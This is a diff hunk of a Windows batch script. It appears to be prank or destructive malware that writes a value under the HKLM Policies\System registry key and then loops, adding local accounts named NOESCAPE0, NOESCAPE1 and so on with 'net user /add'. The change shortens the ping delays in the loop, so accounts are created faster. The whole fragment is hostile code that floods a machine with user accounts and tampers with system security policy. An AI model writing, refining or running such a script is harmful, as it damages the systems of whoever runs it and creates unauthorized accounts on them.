@@ -10,10 +10,10 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 Set /a loop = 0
 
 :loopstart
-ping 127.0.0.1 -n 1 -w 50 >nul
+ping 127.0.0.1 -n 1 -w 25 >nul
 net user NOESCAPE%loop% /add
 
-ping 127.0.0.1 -n 1 -w 50 >nul
+ping 127.0.0.1 -n 1 -w 25 >nul
 goto check
 
 :check
